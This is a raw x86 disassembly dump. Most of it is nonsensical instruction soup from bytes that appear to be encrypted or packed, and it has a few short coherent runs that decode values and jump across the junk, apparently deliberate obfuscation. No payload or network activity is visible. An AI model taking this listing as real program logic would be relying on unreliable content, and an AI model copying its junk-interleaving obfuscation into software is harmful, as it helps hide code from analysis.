  405b2f:	cmp    dl,BYTE PTR [ebx-0x7f]
  405b32:	fidivr WORD PTR [ebx]
  405b34:	stos   DWORD PTR es:[edi],eax
  405b35:	mov    ebp,0x78521e9d
  405b3a:	das    
  405b3b:	jl     0x405adc
  405b3d:	ror    BYTE PTR [eax],cl
  405b3f:	sbb    al,0xcc
  405b41:	cld    
  405b42:	out    0xe5,al
  405b44:	mov    al,ds:0x8a5b4cb5
  405b49:	mov    bh,0x54
  405b4b:	mov    al,ds:0x9fa59f84
  405b50:	fistp  DWORD PTR [ecx+edi*8]
  405b53:	xchg   esp,eax
  405b54:	ret    0x90c
  405b57:	es jnp 0x405b42
  405b5a:	shl    DWORD PTR [eax+0x6c],0xf2
  405b5e:	lock loop 0x405b60
  405b61:	call   0xcf09:0xf82b10ca
  405b68:	outs   dx,DWORD PTR ds:[esi]
  405b69:	xchg   edx,eax
  405b6a:	mov    ds:0xbd060611,eax
  405b6f:	jae    0x405b4d
  405b71:	xchg   DWORD PTR [edx+0x50],esi
  405b74:	loopne 0x405b00
  405b76:	pop    edi
  405b77:	stc    
  405b78:	or     bl,cl
  405b7a:	ficomp WORD PTR [eax]
  405b7c:	inc    edx
  405b7d:	push   ebp
  405b7e:	pop    ebp
  405b7f:	jg     0x405b6b
  405b81:	jge    0x405b58
  405b83:	add    esp,0xbb02573c
  405b89:	mov    eax,DWORD PTR [ebp-0x14]
  405b8c:	xor    eax,esi
  405b8e:	add    eax,edi
  405b90:	push   eax
  405b91:	mov    eax,DWORD PTR [ebp-0x10]
  405b94:	add    eax,0xaa
  405b99:	push   eax
  405b9a:	jmp    0x405d92
  405b9f:	jne    0x405bbe
  405ba1:	adc    eax,0x71b155b1
  405ba6:	fld    DWORD PTR [edi+0x3f]
  405ba9:	mov    dh,0xdb
  405bab:	in     eax,0x2c
  405bad:	fcomi  st,st(4)
  405baf:	pusha  
  405bb0:	sub    DWORD PTR [esi+0x7e],edi
  405bb3:	push   ebp
  405bb4:	jg     0x405c34
  405bb6:	jle    0x405bcb
  405bb8:	inc    edi
  405bb9:	aas    
  405bba:	pop    esp
  405bbb:	iret   
  405bbc:	cmp    BYTE PTR [eax-0x1],ah
  405bbf:	test   eax,0x830e3968
  405bc4:	scas   eax,DWORD PTR es:[edi]
  405bc5:	xor    ch,BYTE PTR [ebp+esi*1+0x5428fe42]
  405bcc:	ins    DWORD PTR es:[edi],dx
  405bcd:	xor    BYTE PTR [ebx],ch
  405bcf:	cmp    eax,0x3d25c088
  405bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bd5:	mov    ah,0x88
  405bd7:	dec    edi
  405bd8:	dec    ecx
  405bd9:	sar    DWORD PTR [ecx],1
  405bdb:	test   al,0x4d
  405bdd:	hlt    
  405bde:	push   eax
  405bdf:	mov    edi,0xbb945ad9
  405be4:	shl    DWORD PTR [ebx+ebx*1+0xe01513],1
  405beb:	jae    0x405be2
  405bed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bee:	outs   dx,BYTE PTR ds:[esi]
  405bef:	mov    bh,0x78
  405bf1:	(bad)  
  405bf2:	cmc    
  405bf3:	or     eax,0xc5e3e90b
  405bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bf9:	fs mov al,0x3a
  405bfc:	gs (bad) 
  405bfe:	sbb    eax,eax
  405c00:	jle    0x405b96
  405c02:	jo     0x405c71
  405c04:	pop    esp
  405c05:	add    esi,edi
  405c07:	push   ds
  405c08:	inc    ebx
  405c09:	pop    ebp
  405c0a:	jle    0x405c0d
  405c0c:	mov    edi,DWORD PTR [edi-0x12]
  405c0f:	shr    DWORD PTR [esi],1
  405c11:	mov    al,0x9d
  405c13:	rcl    DWORD PTR [ebx-0x40],1
  405c16:	jl     0x405c14
  405c18:	xchg   edx,eax
  405c19:	mov    edi,0x3742219c
  405c1e:	lock pop edx
  405c20:	push   DWORD PTR [esi-0x2274fc4e]
  405c26:	sbb    ecx,DWORD PTR [ecx]
  405c28:	lock in al,dx
  405c2a:	enter  0x2a2d,0xf8
  405c2e:	pop    esi
  405c2f:	or     eax,0xbca748f4
  405c34:	lods   al,BYTE PTR ds:[esi]
  405c35:	ss scas al,BYTE PTR es:[edi]
  405c37:	fistp  WORD PTR [esi-0x49]
  405c3a:	mov    edi,DWORD PTR [eax+edi*8+0x7615b74f]
  405c41:	repnz push 0x5c440f7e
  405c47:	cs push edi
  405c49:	inc    ebp
  405c4a:	inc    esp
  405c4b:	dec    edi
  405c4c:	repz adc BYTE PTR [ebx+0x16],bh
  405c50:	sti    
  405c51:	aaa    
  405c52:	xchg   ebp,eax
  405c53:	dec    edx
  405c54:	jne    0x405beb
  405c56:	hlt    
  405c57:	sahf   
  405c58:	jne    0x405c18
  405c5a:	aam    0xdc
  405c5c:	das    
  405c5d:	mov    esp,0xdad59ea0
  405c62:	cmp    eax,0xbfee2589
  405c67:	(bad)  
  405c68:	out    0x12,eax
  405c6a:	lock mov ds:0x4199a4ff,eax
  405c70:	addr16 push esi
  405c72:	aas    
  405c73:	fmul   st,st(4)
  405c75:	mov    fs:0xf9449d64,al
  405c7b:	lahf   
  405c7c:	or     edx,DWORD PTR [edx]
  405c7e:	ds jmp 0x8699ee64
  405c84:	loop   0x405ca1
  405c86:	inc    esi
  405c87:	sahf   
  405c88:	sub    DWORD PTR [ecx+ebx*1+0x3e356e4a],eax
  405c8f:	add    al,0x20
  405c91:	sbb    BYTE PTR [ecx],dl
  405c93:	mov    al,0xc9
  405c95:	out    0x7,eax
  405c97:	imul   edi,DWORD PTR [esp+ebx*4-0x2cfa351d],0xd38ab692
  405ca2:	cs scas al,BYTE PTR es:[edi]
  405ca4:	lea    esi,[ebp+0x7b]
  405ca7:	inc    esp
  405ca8:	popf   
  405ca9:	mul    DWORD PTR [edx+0x7c65de15]
  405caf:	stos   DWORD PTR es:[edi],eax
  405cb0:	fidiv  DWORD PTR [ebx-0x68b22f3f]
  405cb6:	call   0xdfd1:0x97fe012c
  405cbd:	stos   BYTE PTR es:[edi],al
  405cbe:	cdq    
  405cbf:	sbb    DWORD PTR [edi+0x71adf6c7],ecx
  405cc5:	pop    edi
  405cc6:	xor    DWORD PTR ds:0x888a2c42,esi
  405ccc:	xchg   ebp,eax
  405ccd:	mov    ah,0x6c
  405ccf:	inc    ebx
  405cd0:	call   0x8d4a:0xe3d6a987
  405cd7:	fst    QWORD PTR [ebx-0x3b]
  405cda:	js     0x405d34
  405cdc:	cmp    ebx,DWORD PTR ds:0x5705554a
  405ce2:	int3   
  405ce3:	(bad)  
  405ce4:	pop    ss
  405ce5:	lods   eax,DWORD PTR ds:[esi]
  405ce6:	cmp    al,0x36
  405ce8:	fcom   QWORD PTR [ebp-0x7c]
  405ceb:	into   
  405cec:	inc    edx
  405ced:	ins    BYTE PTR es:[edi],dx
  405cee:	or     ah,BYTE PTR [ebp-0x64]
  405cf1:	mov    dl,0x51
  405cf3:	pop    ebp
  405cf4:	cmp    BYTE PTR [ebx-0x4d4bbf0f],dh
  405cfa:	pop    edx
  405cfb:	cwde   
  405cfc:	cli    
  405cfd:	stos   DWORD PTR es:[edi],eax
  405cfe:	(bad)  
  405d00:	in     al,dx
  405d01:	pop    esi
  405d02:	fsubp  st(7),st
  405d04:	sub    BYTE PTR [edi-0x1b0a8801],bh
  405d0a:	and    dh,BYTE PTR [edx]
  405d0c:	mov    esp,0xc3159cc6
  405d11:	xor    ebx,DWORD PTR [ebx-0x65966e05]
  405d17:	push   ds
  405d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d19:	and    bl,bh
  405d1b:	cmp    BYTE PTR [ebx-0x22f1c32a],0xfd
  405d22:	mov    cl,0x44
  405d24:	and    DWORD PTR [eax-0x1a],edx
  405d27:	fs pop edx
  405d29:	repz cmp DWORD PTR [edx+ebp*4],ebx
  405d2d:	ss mov ah,0x88
  405d30:	js     0x405ce9
  405d32:	iret   
  405d33:	fist   DWORD PTR [esi]
  405d35:	mov    eax,0x44385db
  405d3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d3b:	mov    esi,0x4859834f
  405d40:	mov    al,ds:0x7152dee4
  405d45:	daa    
  405d46:	dec    ebx
  405d47:	xchg   edx,eax
  405d48:	cmc    
  405d49:	or     eax,0xc5b98dc8
  405d4e:	sub    eax,0xc24f2c25
  405d53:	xchg   esp,eax
  405d54:	(bad)  [esi+0x3a]
  405d57:	sub    BYTE PTR [esi+eiz*4+0x7c01ef67],ch
  405d5e:	imul   esp,DWORD PTR [esi+edi*4],0xfffffffe
  405d62:	or     BYTE PTR [edx-0x44],dl
  405d65:	add    BYTE PTR [edx-0x25],bl
  405d68:	pop    ebp
  405d69:	sbb    ecx,edx
  405d6b:	push   es
  405d6c:	shr    BYTE PTR [edi-0x3dd3b7c9],cl
  405d72:	cmp    esp,DWORD PTR [edi+0x17199736]
  405d78:	mov    esi,0x57dd01f1
  405d7d:	and    BYTE PTR [ebx+0x6f],dl
  405d80:	in     al,dx
  405d81:	mov    bl,ah
  405d83:	inc    ebx
  405d84:	sub    DWORD PTR [eax+0x62],ecx
  405d87:	sub    BYTE PTR [ecx+eiz*8+0x3a],ch
  405d8b:	and    esi,ebp
  405d8d:	cvttps2pi mm4,xmm3
  405d90:	mov    ds:0xf0458bc3,eax
  405d95:	mov    eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0xa19c135b,al
  405dbe:	lods   al,BYTE PTR ds:[esi]
  405dbf:	xchg   ebp,eax
  405dc0:	pop    ds
  405dc1:	inc    edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e28
  405dca:	imul   edx,DWORD PTR [edx+0x48e9fb3f],0xc5faa424
  405dd4:	shr    DWORD PTR [edi-0x4b2d8ad5],1
  405dda:	add    esi,edi
  405ddc:	xlat   BYTE PTR ds:[ebx]
  405ddd:	and    ebx,edx
  405ddf:	mov    edi,DWORD PTR [ebx-0x173b514]
  405de5:	int    0x29
  405de7:	hlt    
  405de8:	push   ds
  405de9:	adc    DWORD PTR [eax],ebx
  405deb:	mov    dl,dh
  405ded:	call   0xfd4e:0xcae8b27e
  405df4:	or     ch,dl
  405df6:	and    ecx,DWORD PTR [ebp-0x5b042c60]
  405dfc:	mov    al,0x37
  405dfe:	outs   dx,DWORD PTR ds:[esi]
  405dff:	mov    WORD PTR [ebx],?
  405e01:	add    eax,0xaf809dc
  405e06:	arpl   WORD PTR [eax-0x53],si
  405e09:	stos   DWORD PTR es:[edi],eax
  405e0a:	mov    bl,0xe5
  405e0c:	dec    edi
  405e0d:	hlt    
  405e0e:	neg    DWORD PTR [ebp+0x6ee43fd5]
  405e14:	imul   eax,DWORD PTR ds:0xcc9bc9e2,0x89229926
  405e1e:	sbb    DWORD PTR [eax-0x78],eax
  405e21:	dec    esp
  405e22:	ss or  al,0x4d
  405e25:	aad    0x98
  405e27:	sbb    dl,BYTE PTR [ebx]
  405e29:	jns    0x405db6
  405e2b:	rcl    DWORD PTR [ebp+0x29],0xce
  405e2f:	ss inc ebp
  405e31:	jl     0x405e40
  405e33:	sub    BYTE PTR [edi],ah
  405e35:	cld    
  405e36:	xor    al,0xab
  405e38:	(bad)  
  405e39:	nop
  405e3a:	cli    
  405e3b:	dec    edx
  405e3c:	pushf  
  405e3d:	sub    eax,0xf0cf6047
  405e42:	sahf   
  405e43:	cwde   
  405e44:	jmp    0x8054f551
  405e49:	or     ah,BYTE PTR [edi]
  405e4b:	loope  0x405ea6
  405e4d:	inc    eax
  405e4e:	adc    al,0x2c
  405e50:	ja     0x405e70
  405e52:	loopne 0x405e16
  405e54:	xor    DWORD PTR [esi-0x37d2a102],ebx
  405e5a:	hlt    
  405e5b:	in     al,dx
  405e5c:	imul   ecx,DWORD PTR [ebp-0x6d],0xaf203e31
  405e63:	les    ebx,FWORD PTR [esi]
  405e65:	jae    0x405dfb
  405e67:	dec    edx
  405e68:	pop    ds
  405e69:	xchg   ecx,eax
  405e6a:	mov    WORD PTR [edx+0x393fa757],ss
  405e70:	sbb    BYTE PTR ds:0x2bd9a71a,dl
  405e76:	loope  0x405eef
  405e78:	add    eax,0x4f5433a
  405e7d:	cmc    
  405e7e:	sub    eax,0xc8a2dac8
  405e83:	fistp  DWORD PTR [edx+eiz*2]
  405e86:	add    eax,DWORD PTR [eax+0x42151e37]
  405e8c:	call   0xe40a:0x99e2eafe
  405e93:	push   edx
  405e94:	inc    ebp
  405e95:	jo     0x405e2f
  405e97:	or     ch,BYTE PTR [esi+ebx*2]
  405e9a:	shr    DWORD PTR [ecx+0x14e73ec1],cl
  405ea0:	mov    al,ds:0xf64e2a67
  405ea5:	pop    ss
  405ea6:	jg     0x405ea5
  405ea8:	js     0x405e5a
  405eaa:	push   0x62
  405eac:	jl     0x405ef0
  405eae:	icebp  
  405eaf:	inc    esi
  405eb0:	(bad)  
  405eb1:	mov    ebx,0x595ec9ef
  405eb6:	or     ecx,esi
  405eb8:	pop    ebx
  405eb9:	test   eax,0x4c6859e8
  405ebe:	push   esi
  405ebf:	in     al,0xd4
  405ec1:	sbb    eax,0x9ed0044
  405ec6:	int    0x45
  405ec8:	add    esi,DWORD PTR [esi+edi*1-0xb]
  405ecc:	xchg   ebp,eax
  405ecd:	pop    edi
  405ece:	cmp    cl,BYTE PTR es:[edx+0x74]
  405ed2:	push   esp
  405ed3:	jmp    0x405ea8
  405ed5:	or     BYTE PTR [edi+0x1ae3ac42],ah
  405edb:	aam    0x19
  405edd:	js     0x405f53
  405edf:	in     eax,0xc
  405ee1:	stos   DWORD PTR es:[edi],eax
  405ee2:	xor    eax,0x5ab90a6c
  405ee7:	add    eax,0xa4f98bb8
  405eec:	js     0x405eec
  405eee:	clc    
  405eef:	bound  ecx,QWORD PTR [edi-0x1abe6333]
  405ef5:	(bad)  
  405ef6:	cmp    ebx,DWORD PTR [ebp+0x49]
  405ef9:	xchg   BYTE PTR [eax+0x3a],ah
  405efc:	std    
  405efd:	jmp    0xa70f01a4
  405f02:	sub    eax,0x1e704c4c
  405f07:	clc    
  405f08:	pop    ss
  405f09:	aad    0xfe
  405f0b:	push   ebx
  405f0c:	and    ch,BYTE PTR [ebx]
  405f0e:	fsubrp st(2),st
  405f10:	(bad)  
  405f11:	and    bh,BYTE PTR [eax]
  405f13:	mov    ebp,DWORD PTR [ecx-0x6aeffe60]
  405f19:	push   0xb35803df
  405f1e:	js     0x405eac
  405f20:	mov    dl,0xf8
  405f22:	ret    
  405f23:	(bad)  
  405f24:	lods   eax,DWORD PTR ds:[esi]
  405f25:	jecxz  0x405f63
  405f27:	int3   
  405f28:	imul   edx,DWORD PTR [edx],0x190f2ea8
  405f2e:	bound  eax,QWORD PTR [eax]
  405f30:	mov    ch,0xde
  405f32:	dec    esp
  405f33:	and    edx,DWORD PTR [esp+esi*2-0x46]
  405f37:	int3   
  405f38:	xchg   edx,eax
  405f39:	out    0x37,al
  405f3b:	jg     0x405edd
  405f3d:	inc    dh
  405f3f:	stos   BYTE PTR es:[edi],al
  405f40:	jne    0x405f1c
  405f42:	push   edx
  405f43:	std    
  405f44:	addr16 pushf 
  405f46:	rol    DWORD PTR [ebx+0x5e],cl
  405f49:	jge    0x405f34
  405f4b:	(bad)  
  405f4d:	dec    esi
  405f4e:	jp     0x405f87
  405f50:	inc    esi
  405f51:	mov    ebp,0xcdad0b59
  405f56:	xchg   ecx,eax
  405f57:	cli    
  405f58:	mov    dh,0xb0
  405f5a:	jl     0x405fd1
  405f5c:	cmp    cl,dh
  405f5e:	cwde   
  405f5f:	push   ebx
  405f60:	dec    esi
  405f61:	int    0x4e
  405f63:	in     eax,dx
  405f64:	int3   
  405f65:	and    BYTE PTR [ecx+0x2b2f760a],cl
  405f6b:	pop    edi
  405f6c:	sti    
  405f6d:	fdecstp 
  405f6f:	call   0x4331:0x4533c5aa
  405f76:	sbb    eax,0x313a881f
  405f7b:	gs xchg edx,eax
  405f7d:	mov    al,0x52
  405f7f:	shl    ecx,cl
  405f81:	adc    BYTE PTR [ebx],bl
  405f83:	push   ebp
  405f84:	ds pop edi
  405f86:	fsub   DWORD PTR [eax-0x41]
  405f89:	das    
  405f8a:	pop    edx
  405f8b:	pop    ebp
  405f8c:	mov    eax,0xa8d70f07
  405f91:	inc    ebp
  405f92:	or     ah,BYTE PTR [edx-0x7c6b0d]
  405f98:	(bad)  
  405f99:	mov    ?,WORD PTR [edi+0x7ade035f]
  405f9f:	sub    DWORD PTR [esi],edx
  405fa1:	stc    
  405fa2:	imul   esi,esp,0xffffff89
  405fa5:	inc    ebp
  405fa6:	loopne 0x405fb7
  405fa8:	test   BYTE PTR [esi-0x16fffff6],dl
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx+0x33]
  405fbf:	xchg   edi,eax
  405fc0:	pop    ebx
  405fc1:	push   ecx
  405fc2:	call   0x7e7f:0x557e7e35
  405fc9:	jle    0x406011
  405fcb:	adc    DWORD PTR [ecx+0x5d],ebp
  405fce:	cmp    bl,BYTE PTR [esi+0x21b9d769]
  405fd4:	cmc    
  405fd5:	xchg   edx,eax
  405fd6:	push   edi
  405fd7:	add    DWORD PTR [ebx+0x16],0x9db5688e
  405fde:	lahf   
  405fdf:	dec    edi
  405fe0:	add    edi,esi
  405fe2:	mov    edx,0xab048a75
  405fe7:	jo     0x406001
  405fe9:	lds    esp,FWORD PTR [eax]
  405feb:	pop    edi
  405fec:	not    DWORD PTR [ecx+0x12]
  405fef:	or     esp,DWORD PTR [ebx]
  405ff1:	(bad)  
  405ff2:	adc    al,BYTE PTR [eax]
  405ff4:	hlt    
  405ff5:	mov    dh,0x55
  405ff7:	hlt    
  405ff8:	pop    esp
  405ff9:	sbb    BYTE PTR [ecx-0x21],dh
  405ffc:	imul   ebx,DWORD PTR [esp+edi*8-0x368292a8],0xfffffff8
  406004:	mov    bl,0x4c
  406006:	aad    0x84
  406008:	cmc    
  406009:	adc    ah,dh
  40600b:	push   ecx
  40600c:	xchg   esi,eax
  40600d:	pop    es
  40600e:	aas    
  40600f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406010:	pop    ss
  406011:	mov    dh,0x8d
  406013:	out    0xee,al
  406015:	jo     0x405fe7
  406017:	daa    
  406018:	retf   0xbb0a
  40601b:	add    DWORD PTR [eax],esp
  40601d:	ror    DWORD PTR [ebx+0x4652f9bf],1
  406023:	jl     0x406011
  406025:	ins    BYTE PTR es:[edi],dx
  406026:	aas    
  406027:	push   ecx
  406028:	or     edi,edx
  40602a:	mov    DWORD PTR [edx+ebp*8-0x5edd0a6],esp
  406031:	cld    
  406032:	stc    
  406033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406034:	mov    ah,0x89
  406036:	loop   0x405ff0
  406038:	xchg   ebx,eax
  406039:	push   edx
  40603a:	data16 hlt 
  40603c:	out    dx,eax
  40603d:	and    DWORD PTR [edx],0x49
  406040:	outs   dx,DWORD PTR ds:[esi]
  406041:	call   0xae7c36b1
  406046:	addr16 out dx,al
  406048:	sub    eax,DWORD PTR [edx-0x3c]
  40604b:	adc    BYTE PTR [eax],bl
  40604d:	fstp   TBYTE PTR ds:[edx-0x72]
  406051:	or     eax,0xd853d822
  406056:	adc    bl,BYTE PTR [edi]
  406058:	pop    edi
  406059:	mov    bh,0xef
  40605b:	retf   0xdc51
  40605e:	inc    esi
  40605f:	inc    bl
  406061:	hlt    
  406062:	neg    BYTE PTR [edx-0x7b]
  406065:	(bad)  
  406066:	and    eax,0x49e63934
  40606b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40606c:	clc    
  40606d:	cmc    
  40606e:	xchg   ecx,eax
  40606f:	in     al,dx
  406070:	rol    BYTE PTR [edi+eiz*4],0x1c
  406074:	pop    ecx
  406075:	cmc    
  406076:	outs   dx,BYTE PTR ds:[esi]
  406077:	mov    esp,0x5f9ed0c4
  40607c:	jge    0x4060dc
  40607e:	inc    eax
  40607f:	adc    ah,BYTE PTR [ebx]
  406081:	daa    
  406082:	std    
  406083:	xor    bh,BYTE PTR [ebx+0x12]
  406086:	call   0xf4702abe
  40608b:	in     al,dx
  40608c:	mov    eax,0x6915ded2
  406091:	mov    esp,0xba5c5b39
  406096:	in     eax,dx
  406097:	jne    0x4060ad
  406099:	loope  0x40605d
  40609b:	dec    edx
  40609c:	data16 fld DWORD PTR [ebp+0x1b5deb2b]
  4060a3:	js     0x406115
  4060a5:	push   edx
  4060a6:	ins    BYTE PTR es:[edi],dx
  4060a7:	jmp    0xf1aa:0x9d238a76
  4060ae:	jecxz  0x40607c
  4060b0:	rcl    BYTE PTR [edx],0x44
  4060b3:	inc    eax
  4060b4:	push   0x95e71672
  4060b9:	fadd   st(6),st
  4060bb:	lods   eax,DWORD PTR ds:[esi]
  4060bc:	into   
  4060bd:	stos   BYTE PTR es:[edi],al
  4060be:	add    ah,BYTE PTR [edx-0x68]
  4060c1:	in     al,0x82
  4060c3:	mov    dl,BYTE PTR [ebp+0x2840241d]
  4060c9:	mov    al,ds:0x3f7ad6e6
  4060ce:	adc    ebx,DWORD PTR [edx]
  4060d0:	push   cs
  4060d1:	retf   0x76a7
  4060d4:	inc    ebp
  4060d5:	xor    eax,0xe0f99f58
  4060da:	jno    0x406071
  4060dc:	ret    0xd5e8
  4060df:	dec    edx
  4060e0:	or     al,0x69
  4060e2:	dec    edx
  4060e3:	(bad)  
  4060e4:	icebp  
  4060e5:	int3   
  4060e6:	adc    BYTE PTR [esi],dl
  4060e8:	popa   
  4060e9:	dec    ebp
  4060ea:	xor    eax,0x9d15eff1
  4060ef:	test   eax,0x82204a44
  4060f4:	jbe    0x40609a
  4060f6:	retf   
  4060f7:	out    dx,al
  4060f8:	mov    ebp,0xa0f2c450
  4060fd:	sbb    al,0x44
  4060ff:	mov    ecx,0xfef3d07f
  406104:	pop    edi
  406105:	inc    DWORD PTR [ebx+0x1858fd14]
  40610b:	aad    0xd9
  40610d:	jns    0x40612f
  40610f:	nop
  406110:	out    0x1d,al
  406112:	dec    edx
  406113:	xor    ebp,DWORD PTR [edx+0x3df64b8e]
  406119:	adc    cl,BYTE PTR [eax]
  40611b:	jmp    0xb0ff:0x441e0b28
  406122:	jae    0x4060d2
  406124:	mov    esp,0xf9dcbf8
  406129:	lods   eax,DWORD PTR ds:[esi]
  40612a:	xchg   BYTE PTR [ecx],al
  40612c:	outs   dx,DWORD PTR ds:[esi]
  40612d:	jl     0x406140
  40612f:	adc    esi,DWORD PTR [esi+0x65ad19aa]
  406135:	mov    DWORD PTR [esi+0x5],esp
  406138:	add    eax,DWORD PTR [esi-0x72]
  40613b:	je     0x4061a6
  40613d:	fs sub al,0x1d
  406140:	jb     0x406148
  406142:	rol    bl,0xed
  406145:	loop   0x40618d
  406147:	sbb    al,0xd7
  406149:	xchg   ebx,eax
  40614a:	je     0x406187
  40614c:	or     DWORD PTR [edi-0x36],esp
  40614f:	in     eax,0xc
  406151:	jnp    0x4060fc
  406153:	outs   dx,DWORD PTR ds:[esi]
  406155:	mov    gs,ebx
  406157:	xchg   esp,eax
  406158:	jl     0x4060ec
  40615a:	cmc    
  40615b:	fwait
  40615c:	aad    0x60
  40615e:	retf   0x2e9c
  406161:	mov    BYTE PTR [edx],dl
  406163:	loope  0x406199
  406165:	cs call 0x71ec:0xf12b1bd7
  40616d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40616f:	adc    bl,ch
  406171:	jno    0x4060f3
  406173:	rcl    DWORD PTR [edx+0x4147c055],cl
  406179:	jg     0x406154
  40617b:	loope  0x4061e7
  40617d:	mov    bp,cs
  406180:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406181:	xchg   edi,edx
  406183:	cmc    
  406184:	push   ds
  406185:	xlat   BYTE PTR ds:[ebx]
  406186:	ds mov esp,0xf32839c3
  40618c:	(bad)  
  40618d:	sub    BYTE PTR [ecx],bl
  40618f:	add    DWORD PTR [ecx-0x1d8e24da],ebx
  406195:	xchg   ecx,eax
  406196:	js     0x4061b2
  406198:	xchg   DWORD PTR [ecx-0x4],edi
  40619b:	int    0xa1
  40619d:	ja     0x406150
  40619f:	dec    esp
  4061a0:	xchg   esp,eax
  4061a1:	retf   0x3b1a
  4061a4:	test   eax,0x50e8458d
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	and    al,0x6
  4061d3:	add    BYTE PTR [edx],cl
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061af
  4061de:	clc    
  4061df:	push   0x359e08e5
  4061e4:	in     al,dx
  4061e5:	cwde   
  4061e6:	addr16 add al,0x93
  4061e9:	rcr    bl,0xd5
  4061ec:	(bad)  
  4061ed:	xlat   BYTE PTR ds:[ebx]
  4061ee:	push   0xffffffac
  4061f0:	mov    ah,0xe7
  4061f2:	and    BYTE PTR [edx+0x7a],dl
  4061f5:	outs   dx,DWORD PTR ds:[esi]
  4061f6:	and    edx,DWORD PTR ds:0xe96cba16
  4061fc:	jns    0x4061ee
  4061fe:	or     BYTE PTR [edx+0x53],0x4d
  406202:	loopne 0x406224
  406204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406205:	pop    es
  406206:	ret    
  406207:	stc    
  406208:	mov    dh,0x45
  40620a:	mov    ecx,0xb073097f
  40620f:	jne    0x4061b6
  406211:	mov    eax,ds:0xaa13d800
  406216:	mov    al,0xa0
  406218:	loope  0x4061a2
  40621a:	mov    dl,0x3a
  40621c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40621d:	(bad)  
  40621e:	das    
  40621f:	mov    edi,0x74dd57d7
  406224:	sti    
  406225:	call   DWORD PTR [edi-0x2ee3cced]
  40622b:	push   ss
  40622c:	dec    edi
  40622d:	jb     0x406273
  40622f:	daa    
  406230:	mov    edi,0xa038868a
  406235:	xor    al,0x29
  406237:	outs   dx,BYTE PTR ds:[esi]
  406238:	sbb    BYTE PTR [edx+eiz*1+0x27],0x1e
  40623d:	test   al,0x7f
  40623f:	inc    esp
  406240:	test   BYTE PTR [esi+0x5e2d5f45],dh
  406246:	adc    BYTE PTR ds:[ebp+0x2b],al
  40624a:	mov    al,ds:0x7250dbdf
  40624f:	sub    ebx,DWORD PTR [esi+ebp*2+0x0]
  406253:	or     BYTE PTR [ebp+0x4f],dl
  406256:	pop    ecx
  406257:	aas    
  406258:	rcl    DWORD PTR [edx+esi*8],1
  40625b:	or     BYTE PTR [eax+0x56],bh
  40625e:	das    
  40625f:	lods   al,BYTE PTR ds:[esi]
  406260:	stos   DWORD PTR es:[edi],eax
  406261:	mov    cl,0x28
  406263:	ficomp WORD PTR [ebx-0x37530d8a]
  406269:	mov    dl,0xf5
  40626b:	(bad)  
  40626c:	popa   
  40626d:	xchg   esp,eax
  40626e:	hlt    
  40626f:	mov    bh,dl
  406271:	(bad)  
  406272:	push   edx
  406273:	call   0x88efb138
  406278:	push   ss
  406279:	neg    DWORD PTR [eax+esi*8]
  40627c:	add    eax,0x730fd905
  406281:	and    ebp,DWORD PTR ds:0x10c4ce8c
  406287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406288:	xchg   DWORD PTR [ebx+0x3e],edi
  40628b:	or     al,0xb7
  40628d:	and    ch,BYTE PTR [ebp+0x1b]
  406290:	cmp    eax,0x910bade
  406295:	adc    al,0xfb
  406297:	js     0x4062ea
  406299:	cld    
  40629a:	les    ebx,FWORD PTR [esi-0x5c6af64d]
  4062a0:	or     BYTE PTR [ebx],bh
  4062a2:	aaa    
  4062a3:	mov    al,0x6c
  4062a5:	das    
  4062a6:	je     0x4062e3
  4062a8:	clc    
  4062a9:	lds    ebx,FWORD PTR [esi-0x4f]
  4062ac:	add    edi,ebx
  4062ae:	mov    al,ds:0xde36c1b4
  4062b3:	and    al,0xb7
  4062b5:	stos   DWORD PTR es:[edi],eax
  4062b6:	dec    esp
  4062b7:	mov    ebp,0x58051cce
  4062bc:	es or  al,0xcc
  4062bf:	and    BYTE PTR [esi],ch
  4062c1:	idiv   bh
  4062c3:	sbb    eax,0xd3b4826e
  4062c8:	cs nop
  4062ca:	ret    0x1c4
  4062cd:	scas   eax,DWORD PTR es:[edi]
  4062ce:	push   0xfffffffa
  4062d0:	pop    ebx
  4062d1:	dec    ecx
  4062d2:	adc    ah,BYTE PTR [eax+0x39]
  4062d5:	mov    edx,0x98c44b11
  4062da:	xor    eax,0x412a0165
  4062df:	in     eax,dx
